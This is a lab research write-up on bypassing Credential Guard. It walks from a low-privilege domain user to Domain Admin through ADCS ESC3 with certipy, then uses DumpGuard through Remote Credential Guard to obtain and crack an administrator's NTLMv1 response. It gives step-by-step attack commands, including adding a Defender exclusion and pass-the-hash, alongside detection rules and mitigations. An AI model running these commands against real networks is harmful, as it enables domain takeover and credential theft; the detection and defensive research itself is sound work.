# Credential Guard Bypass via Remote Credential Guard Protocol Abuse (SpecterOps research testing)

**Author:** Osher Jacobs
**Series:** AD/Identity Security Research — Vector Series  
**Date:** May 2026  
**Research Credit:** SpecterOps — Valdemar Carøe, "Catching Credential Guard Off Guard" (October 2025)  
**PoC Tool:** [DumpGuard v2.2](https://github.com/bytewreck/DumpGuard)

---

## TL;DR

A standard domain user with no special privileges escalated to Domain Admin via an ADCS ESC3 misconfiguration, then extracted DA credentials from an active RDP session — on a server where defenders had operationalized Credential Guard as protection against credential theft — without opening a single handle to LSASS. Zero LSASS alerts fired — because LSASS was never touched. Microsoft declined to patch. Intended behavior.

---

## Threat Model

**Environment:** Enterprise AD domain. Credential Guard enforced on endpoints via GPO. Sysadmins RDP from CG-enabled workstations into servers. Internal CA deployed. Blue team detection centered on LSASS access telemetry.

**Assumed breach:** Single standard domain user account — `testuser` — no local admin, no special group membership. Obtained via phishing or password spray.

**Defensive assumption under test:** "Credential Guard protects DA credentials even under host compromise. LSASS dump on the RDP server returns nothing useful."

**Finding:** That assumption is incomplete. The RCG protocol layer bridges VTL0 and VTL1 in ways that allow credential material to be brokered without LSASS access. DumpGuard exploits this. Microsoft considers it intended behavior.

---

## Lab Environment

| Hostname | IP | OS | Role |
|---|---|---|---|
| WIN-JOCP945SK51 | 192.168.1.251 | Windows Server 2019 | DC01 + ADCS CA |
| DESKTOP-RD3160S | 192.168.1.165 | Windows 11 Enterprise | WIN-CLIENT — CG enabled |
| WIN-1KS84GNPAUM | 192.168.1.198 | Windows Server 2022 | SRV02 — RDP target |
| Kali | 192.168.1.218 | Kali Linux | Attacker |
| ELK | 192.168.1.250 | Ubuntu | Telemetry stack |

**Domain:** lab2019.local  
**Winlogbeat → Elasticsearch/Kibana 8.19.14**  
**Sysmon deployed on SRV02 and WIN-ATTACK**

---

## Attack Chain

### Phase 1 — Low Privilege to Domain Admin via ADCS ESC3

**Prerequisite:** Two misconfigured ADCS templates:
- `VulnEnrollmentAgent` — Enrollment Agent template, enrollable by `lowprivusers` (domain users group)
- `VulnUser` — Client auth template requiring EA signature, enrollable by Domain Users

This misconfiguration is common in enterprise environments with default CA deployments. The templates are routinely left unaudited.

**Step 1 — Confirm testuser is low privilege**
```bash
nxc ldap 192.168.1.251 -u testuser -p 'Password123!' --groups
```
testuser is a member of `lowprivusers` only. No admin, no special rights.

**Step 2 — Enroll in VulnEnrollmentAgent**
```bash
certipy req -u testuser@lab2019.local -p 'Password123!' \
  -ca 'lab2019-WIN-JOCP945SK51-CA' \
  -template VulnEnrollmentAgent \
  -dc-ip 192.168.1.251
```
Output: `testuser.pfx` — Enrollment Agent certificate.

**Step 3 — Request DA certificate on behalf of Administrator**
```bash
certipy req -u testuser@lab2019.local -p 'Password123!' \
  -ca 'lab2019-WIN-JOCP945SK51-CA' \
  -template VulnUser \
  -on-behalf-of 'lab2019\Administrator' \
  -pfx testuser.pfx \
  -dc-ip 192.168.1.251
```
Output: `administrator.pfx` — DA client authentication certificate.

**Step 4 — PKINIT — exchange certificate for DA TGT and NT hash**
```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.251
```
Output:
```
[*] Got hash for 'administrator@lab2019.local': aad3b435b51404eeaad3b435b51404ee:3c02****************************
```

**Step 5 — Verify DA access**
```bash
nxc smb 192.168.1.251 -u Administrator -H <NT hash>
```
Output: `(Pwn3d!)`

**testuser → Domain Admin in 3 certipy commands. No exploit. No vulnerability in the traditional sense — misconfigured certificate templates.**

---

### Phase 2 — Credential Extraction via DumpGuard (RCG/CG Bypass)

**Setup — Victim RDP session**

A legitimate DA (`lab2019\Administrator`) RDPs from WIN-CLIENT (DESKTOP-RD3160S, CG enabled) into SRV02 (WIN-1KS84GNPAUM). Because CG is running on WIN-CLIENT, all authentication operations are redirected back to the client via Remote Credential Guard. LSASS on SRV02 has no usable DA credential material. Traditional LSASS dumping returns nothing.

The significance is not the initial compromise — it is that credential operations remain brokerable through RCG without generating the LSASS telemetry most detections rely on.

**Step 1 — Create machine account with SPN (prerequisite for DumpGuard)**

DumpGuard requires a domain account with a registered SPN to drive the RCG authentication flow. Any SPN-enabled account works. Machine accounts are convenient — domain users can create up to 10 by default.

```bash
# From Kali using impacket
addcomputer.py -computer-name 'SRV10$' -computer-pass 'Password123!' \
  -dc-ip 192.168.1.251 'lab2019.local/testuser:Password123!'
```

**Step 2 — Add Defender exclusion on SRV02**

Local admin (DA) adds exclusion to drop DumpGuard outside Defender scan scope. EID 5007 fires — this is the upstream detection primitive.

```bash
nxc smb 192.168.1.198 -u Administrator -H <NT hash> \
  -x 'powershell Add-MpPreference -ExclusionPath C:\Windows\Tasks' --no-output
```

**Step 3 — Deploy DumpGuard on SRV02**
```bash
nxc smb 192.168.1.198 -u Administrator -H <NT hash> \
  --put-file /tmp/DumpGuard/DumpGuard.exe '\Windows\Tasks\DumpGuard.exe'
```

**Step 4 — Execute DumpGuard as SYSTEM on SRV02**
```bash
nxc smb 192.168.1.198 -u Administrator -H <NT hash> \
  -x 'C:\Windows\Tasks\DumpGuard.exe /mode:all /command:ntlmv1 /target:all /domain:lab2019.local /username:SRV10$ /password:Password123! > C:\Windows\Tasks\output.txt' \
  --no-output
```

DumpGuard iterates all active logon sessions (LUIDs) on SRV02. For each session it impersonates the token and attempts to drive an NTLM authentication operation via the RCG protocol. For the DA session originating from WIN-CLIENT, Windows routes the NTLM challenge back to WIN-CLIENT where CG processes it and returns an NTLMv1 response. No LSASS handle is opened on either machine.

**Step 5 — Retrieve output**
```bash
nxc smb 192.168.1.198 -u Administrator -H <NT hash> \
  --get-file '\Windows\Tasks\output.txt' /tmp/output.txt
cat /tmp/output.txt
```

Output (relevant line):
```
Administrator::::531b****************************************************:1122334455667788
```

**Step 6 — Crack NTLMv1 response**
```bash
hashcat -m 5500 "Administrator::::531b****************************************************:1122334455667788" rockyou.txt
```

Result: `j***********` — DA plaintext recovered.

Alternatively submit the NTLMv1 response to for rainbow table lookup. Google is your friend. 
I'm sure no OPSEC warnings are necessary if you've gotten this far.

**Step 7 — PTH to DC**
```bash
nxc smb 192.168.1.251 -u Administrator -H <NT hash>
```

Output: `(Pwn3d!)`

---

## Why This Works

CG isolates credential material in VTL1 (LsaIso.exe). Direct LSASS access from VTL0 is blocked — `NtOpenProcess` returns `0xC0000022` (ACCESS_DENIED) against LSASS when PPL/CG is active.

However, the Remote Credential Guard protocol is designed to proxy authentication operations from an RDP server back to the client. The RDP server calls `MsV1_0Lm20GetChallengeResponse` for a given logon session LUID. For RCG-backed sessions, Windows transparently routes this call back to the client where CG handles it and returns the response.

DumpGuard impersonates tokens for each LUID on the server and drives this authentication flow with a static challenge (`1122334455667788`). The response is captured. CG on WIN-CLIENT processed the request exactly as designed — and that was the problem.

**Microsoft was informed and declined to patch. This is considered intended behavior of RCG.**

---

## Detection Telemetry

### What fired

| EID | Rule | Host | Source | Significance |
|---|---|---|---|---|
| 5007 | Defender Exclusion Added | SRV02 | `Add-MpPreference` | **Primary attack signal — upstream of everything** |
| 5145 | Admin Share C$ Access | SRV02 | Kali 192.168.1.218 | nxc file operations — delivery and retrieval |
| 10 | LSASS PROCESS_ALL_ACCESS | SRV02 | `csrss.exe`, `wininit.exe` | **Boot noise — false positives, unrelated to attack** |

### What did NOT fire

- No LSASS access alert from DumpGuard — no handle opened
- No credential dump alert
- No process injection alert
- No anomalous LSASS memory access

### Detection conclusion

Defenders who operationalize Credential Guard as "no LSASS dump = credentials protected" will miss this entirely. The credential extraction generates no LSASS telemetry — because LSASS was never touched. The usable credential material was never extracted from LSASS memory. The attack bypassed LSASS entirely and abused the authentication flow itself.

The attack surface visible to the detection stack is:

1. **EID 5007** — Defender exclusion modification. This fires before any credential activity. It is the universal upstream signal regardless of technique variant. Correlate with subsequent process creation and SMB activity on the same host.
2. **EID 5145** — Admin share access from an unexpected external host. The relative target name (`Windows\Tasks\output.txt`) is a strong contextual indicator when correlated with the exclusion event.
3. **EID 1 (Sysmon process create)** — Binary execution from `C:\Windows\Tasks`. DumpGuard.exe would fire this rule. The Defender exclusion is what prevents Defender from killing it — Sysmon still sees it.

### Kibana detection rule (EID 5007 correlation)
```
event.code: "5007" and 
event.provider: "Microsoft-Windows-Windows Defender" and 
winlog.event_data.New Value: *Exclusions*
```

### Detection tuning note

The LSASS PROCESS_ALL_ACCESS rule (EID 10) should exclude known system processes: `csrss.exe`, `wininit.exe`, `Sysmon64.exe`. These generate boot-time false positives that dilute the signal. Tune the rule to exclude `SourceImage` paths under `System32` with clean call traces.

---

## Mitigations

| Mitigation | Effectiveness | Practicality |
|---|---|---|
| Disable NTLMv1 (GPO) | **High** — removes the crackable response entirely | **Low** — legacy application compatibility is a real constraint in most enterprises |
| Strong unique DA passwords | **Medium** — cracking fails; hash still usable for PTH | **High** — basic hygiene |
| No persistent admin RDP sessions | **High** — no active LUID to target | **Medium** — requires session hygiene discipline |
| Fix ADCS ESC3 misconfiguration | **High** — removes Phase 1 escalation path entirely | **High** — audit and remediate certificate template ACLs |
| Alert on EID 5007 + correlate with process creation | **Medium** — catches the setup, not the extraction | **High** — already in most detection stacks |
| PPL on LSASS | **None** — entirely orthogonal to this technique | N/A |

---

## Important Caveats

- This technique requires SYSTEM on the RDP target server. DA implies SYSTEM on any domain machine via WMI/service creation. This is not an additional assumption — it follows directly from Phase 1.
- NTLMv1 cracking is the weak link. Against strong passwords absent from both wordlists and precomputed rainbow tables, the response is not crackable. The NT hash recovered via PKINIT in Phase 1 bypasses this entirely — cracking is only required if the Phase 2 response is the sole output.
- Microsoft's actual security boundary for CG is nuanced. The correct framing is not "CG is defeated" but "authentication abuse opportunities exist without LSASS telemetry once SYSTEM is achieved on an RDP host with active RCG sessions."
- NTLMv2 enforcement via GPO prevents DumpGuard's `/command:ntlmv1` from working. `/command:msv10` (the MSV1_0 interface variant) may work differently — see SpecterOps paper for details.

---

## References

- SpecterOps — "Catching Credential Guard Off Guard" (Valdemar Carøe, October 2025): https://specterops.io/blog/2025/10/23/catching-credential-guard-off-guard/
- DumpGuard v2.2 PoC: https://github.com/bytewreck/DumpGuard
- Certipy: https://github.com/ly4k/Certipy
- NetExec: https://github.com/Pennyw0rth/NetExec

---

## Scope Disclosure

All testing conducted in an isolated lab environment. No production systems were involved. No working binaries are published. Research scope is disclosed in full. This research is published for defensive and detection engineering purposes.

---

*Osher Jacobs | Silent Service | github.com/osherjacobs/AD-Lab-Research*

Lowpriv to admin via ESC3:

<img width="1879" height="999" alt="attackredacted" src="https://github.com/user-attachments/assets/443cb765-d0ad-49f5-aae4-27d3265dbd06" />

Dumpguard

<img width="1856" height="235" alt="dumpguard" src="https://github.com/user-attachments/assets/ed4e025d-5093-4e6e-810d-b5419632a18d" />

Credential material retrieved using dumpguard remotely via nxc

<img width="1031" height="278" alt="credmaterialretrievedwithdumpguardvianxc" src="https://github.com/user-attachments/assets/4a2d127d-0749-4cde-8059-6b52e22d8c1b" />

Hashcat cracking of credential material to obtain plaintext password

<img width="1668" height="655" alt="hashcatcrack" src="https://github.com/user-attachments/assets/092cf5ff-3d6f-42c8-ac3d-de6636c4a98a" />

PTH

<img width="1868" height="105" alt="PTH" src="https://github.com/user-attachments/assets/a1850404-1d22-47f1-acf6-f292600cdd77" />

SIEM:

<img width="1870" height="964" alt="LSASSALERTS_NONCGRELATED" src="https://github.com/user-attachments/assets/05b25dcf-2874-472b-8604-a85e40961e9b" />

<img width="1877" height="967" alt="Deliverymechanismoutpuittxtretrieval" src="https://github.com/user-attachments/assets/9c8ecd95-194a-492d-8ff2-05977d0609fb" />

<img width="1662" height="492" alt="telemetryoutputtxt" src="https://github.com/user-attachments/assets/9b7a23e5-9fb7-4e84-8d1e-1443cce3ae2b" />


















